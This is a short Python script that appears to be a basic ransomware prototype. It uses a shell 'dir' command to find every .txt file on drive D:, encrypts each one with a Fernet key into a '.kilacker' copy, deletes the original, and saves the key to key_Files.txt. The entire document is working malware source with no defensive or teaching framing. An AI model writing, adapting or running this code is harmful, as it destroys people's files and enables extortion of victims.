import os
from subprocess import check_output
from cryptography.fernet import Fernet

#generate key for encrypte all files
key = Fernet.generate_key()


# create class with key
key2 = Fernet(key)

desired_format="txt"


#get files list
fille = check_output(f"D: && dir /S /B *{desired_format}",shell=True).decode().split()
#write key in txt


for fileasli in fille:
    dirlist = open(fileasli,"rb")#rb = ready binary
    data = dirlist.read()
    encdata = key2.encrypt(data)
    new_file = open(fileasli+".kilacker","wb")
    new_file.write(encdata)
    new_file.close()
    dirlist.close()
    os.remove(fileasli)

key_file = open("key_Files.txt","wb")
key_file.write(key)
key_file.close()


print(fileasli)